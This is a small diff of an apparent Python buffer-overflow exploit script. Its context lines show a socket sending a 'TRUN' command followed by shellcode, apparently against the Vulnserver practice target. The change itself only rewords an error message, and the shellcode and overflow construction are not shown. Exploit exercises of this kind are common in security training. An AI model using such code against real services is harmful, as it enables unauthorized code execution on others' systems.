@@ -13,7 +13,7 @@ try:
       s.send(('TRUN / .:/' + shellcode))
       s.close()
 except:
-      print "Error connecting to server"
+      print "Error connecting to the server"
       sys.exit()                  
                                    
                           
